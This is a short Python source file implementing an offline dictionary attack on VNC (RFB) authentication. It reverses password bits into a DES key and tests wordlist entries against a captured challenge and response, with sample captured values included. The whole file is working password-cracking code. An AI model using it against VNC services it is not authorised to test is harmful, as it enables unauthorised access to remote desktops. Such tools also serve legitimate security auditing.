import multiprocessing
import pyDes


# Taken from http://code.google.com/p/python-vnc-viewer/source/browse/rfb.py
class RFBDes(pyDes.des):
    def setKey(self, key):
        """RFB protocol for authentication requires client to encrypt
           challenge sent by server with password using DES method. However,
           bits in each byte of the password are put in reverse order before
           using it as encryption key."""
        newkey = []
        for ki in range(len(key)):
            bsrc = ord(key[ki])
            btgt = 0
            for i in range(8):
                if bsrc & (1 << i):
                    btgt |= 1 << 7 - i
            newkey.append(chr(btgt))
        super(RFBDes, self).setKey(newkey)


class VNCDecoder(multiprocessing.Process):

    def __init__(self, resq, challenge, response, passwd_file='plist.txt'):
        super(VNCDecoder, self).__init__()
        self.challenge = challenge
        self.response = response
        self.passwd_file = passwd_file
        self.matching_pass = None
        self.resq = resq

    def run(self):
        with open(self.passwd_file, 'r') as plist:
            for password in plist:
                password = password.strip('\n')
                key = (password + '\0' * 8)[:8]
                encryptor = RFBDes(key)
                resp = encryptor.encrypt(self.challenge)
                if resp == self.response:
                    self.matching_pass = key
                    self.resq.put(key)

if __name__ == '__main__':
    # challenge = '\xae\xe1`\xab\x97Td\xfc\xbc4Vcr\x87\r\x8e'
    # response = '*\xa7\x87\xe1\x96dC>)U\xb3\xc6\x03\xcb\x86\xf7'

    challenge = '\x1f\x9c+\t\x14\x03\xfaj\xde\x97p\xe9e\xca\x08\xff'
    response = '\xe7\xe2\xe2\xa8\x89T\x87\x8d\xf01\x96\x10\xfe\xb9\xc5\xbb'
    resultq = multiprocessing.Queue()
    d = VNCDecoder(resultq, challenge, response)
    d.start()
    d.join()
    print resultq.get()